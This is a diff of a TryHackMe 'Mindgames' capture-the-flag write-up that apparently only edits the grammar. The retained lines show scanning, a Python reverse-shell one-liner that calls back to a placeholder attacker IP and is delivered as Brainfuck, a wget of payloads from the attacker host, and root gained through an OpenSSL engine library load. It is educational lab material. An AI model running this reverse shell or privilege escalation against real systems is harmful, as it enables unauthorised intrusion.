@@ -2,12 +2,11 @@
 
 Challenge Link: [Mindgames](https://tryhackme.com/room/mindgames)
 
-Mindgames is a hard rated box on TryHackMe. We're tasked with enumerating, gaining initial access, then a somewhat tricky privilege escalation using a Library Load via OpenSSL.
+Mindgames is a hard rated box on TryHackMe. We're tasked with enumerating, gaining initial access,and then a somewhat tricky privilege escalation using a Library Load via OpenSSL.
 
 ## Recon
 
 There wasn't that much enumeration to do since we only found 2 ports open: 22 running ssh and 80 running a HTTP server from our NMAP scan.
-
 ```markdown
 # Nmap 7.80 scan initiated Tue Jun 16 23:26:12 2020 as: nmap -sC -sV -o nmap 10.10.91.145
 Nmap scan report for 10.10.91.145
@@ -26,7 +25,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 ```
 
-We see that port 80 is open, so I decided to run a GoBuster scan to see if we could find anything. After about 10 minutes of scanning, I figured there were no directories on the site.
+We see that port 80 is open, so I decided to run a GoBuster scan to see if I could find anything. After about 10 minutes of scanning, I figured there were no directories on the site.
 ```markdown
 root@kali:~/THM/mindgames# gobuster dir -u 10.10.91.145 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 
 ===============================================================
@@ -54,7 +53,7 @@ Progress: 19932 / 87665 (22.74%)^C
 Let's go check out the page!
 ![image]({{0xtaylur.github.io}}/assets/mindgames_page.png)
 
-Hmmm, very intersting. Seems as if the the page decodes the _Brainfuck_ programming language. Let's see what happens when we throw the "Hello, World" section into the textbox.
+Hmmm, very intersting. It seems as if the the page decodes the _Brainfuck_ programming language. Let's see what happens when we throw the "Hello, World" section into the textbox.
 ![image]({{0xtaylur.github.io}}/assets/hello_world.png)
 
 It just prints _"Hello, World"_. Now let's see what happens when we try it with the Fibonacci brainfuck text.
@@ -65,7 +64,7 @@ So it seems like it it runs the actual brainfuck progamming language. Let's see 
 import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
 ```
 
-After I changed the default IP in that code block to my tun0 IP.(You can find that out by using the command _ifconfig_ in your terminal).I started a netcat session listening on port 1234. I then headed over to a brainfuck encoder to convert it, let's throw this code into the mindgames site and see if we can get an initial shell.
+After I changed the default IP in that code block to my tun0 IP. (You can find that out by using the command _ifconfig_ in your terminal). I started a netcat session listening on port 1234. I then headed over to a brainfuck encoder to convert it, let's throw this code into the mindgames site and see if we can get an initial shell.
 
 We successfully get a reverse shell as user: _mindgames_
 ![image]({{0xtaylur.github.io}}/assets/initial_shell.png)
@@ -77,7 +76,7 @@ From here, we can go back one directory and read into _user.txt_
 
 Let's start off with using LinEnum to see if we can look into any interesting files that we can use to start our privilege escalation. On your host machine, change into your directory where you have _LinEnum_ stored. If you do not have LinEnum you can get it [here](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh) by using the _wget_ command.
 
-On your host machine, start a SimpleHTTPServer on port 8000 by using this command.
+On your host machine, start a SimpleHTTPServer on port 8000 by using this command:
 ```markdown
 python -m SimpleHTTPServer
 ```
@@ -96,12 +95,12 @@ Saving to: ‘LinEnum.sh’
 2020-06-17 15:36:22 (106 KB/s) - ‘LinEnum.sh’ saved [46631/46631]
 ```
 
-Now let's make it an executable file, by using _chmod +x LinEnum.sh_. Run LinEnum by using "./LinEnum.sh"
+Now let's make it an executable file by using _chmod +x LinEnum.sh_. Run LinEnum by using "./LinEnum.sh".
 
 After reading through LinEnum we find that _/usr/bin/openssl_ has [POSIX](https://uwsgi-docs.readthedocs.io/en/latest/Capabilities.html) capability.
 ![image]({{0xtaylur.github.io}}/assets/openssl.png)
 
-After I bit of research I found a library load via OpenSSL using the C programming language. Create a C file named _engine.c_ and put this code block inside of it.
+After a bit of research, I found a library load via OpenSSL using the C programming language. Create a C file named _engine.c_ and put this code block inside of it.
 ```markdown
 #include <unistd.h>
 
@@ -112,12 +111,12 @@ static void init() {
 }
 ```
 
-After we have made this C file, we must compile it using this command.
+After we have made this C file, we must compile it using this command:
 ```markdown
 gcc -fPIC -o a.o -c engine.c && gcc -shared -o engine.so -Lcrypto a.o
 ```
 
-Once compiled set up another SimpleHTTPServer and grab the engine.so file from your host machine onto the reverse shell.
+Once compiled, set up another SimpleHTTPServer and grab the engine.so file from your host machine onto the reverse shell.
 ```markdown
 $ wget YOUR_IP:8000/engine.so
 --2020-06-17 15:55:53--  http://YOUR_IP:8000/engine.so
@@ -134,7 +133,7 @@ Saving to: ‘engine.so’
 We can now open GTFOBins and search for an OpenSSL Library Load.
 ![image]({{0xtaylur.github.io}}/assets/gtfo.png)
 
-We can now run this command but switch out "./lib.so" with "./engine.so"
+We can now run this command but switch out "./lib.so" with "./engine.so".
 ![image]({{0xtaylur.github.io}}/assets/got_root.png)
 
 We are now root! We should now be able to cat the root flag.
